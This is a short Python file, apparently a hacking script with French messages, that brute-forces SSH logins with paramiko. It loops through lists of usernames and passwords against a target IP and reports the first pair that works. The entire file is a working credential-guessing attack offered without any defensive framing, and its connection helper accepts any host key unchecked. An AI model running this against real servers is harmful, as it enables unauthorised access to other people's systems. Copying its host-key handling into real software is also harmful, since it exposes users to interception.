# ssh.py

import paramiko

def connexion_ssh(ip, user, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=user, password=password)
        print(f"Connexion SSH réussie à {ip}")
        return True
    except Exception as e:
        print(f"Échec de la connexion SSH à {ip}: {e}")
        return False

def brute_force_ssh(ip, user_list, password_list):
    for user in user_list:
        for password in password_list:
            if connexion_ssh(ip, user, password):
                print(f"Succès : {user}:{password}")
                return user, password
    print("Brute-force SSH échoué")
    return None
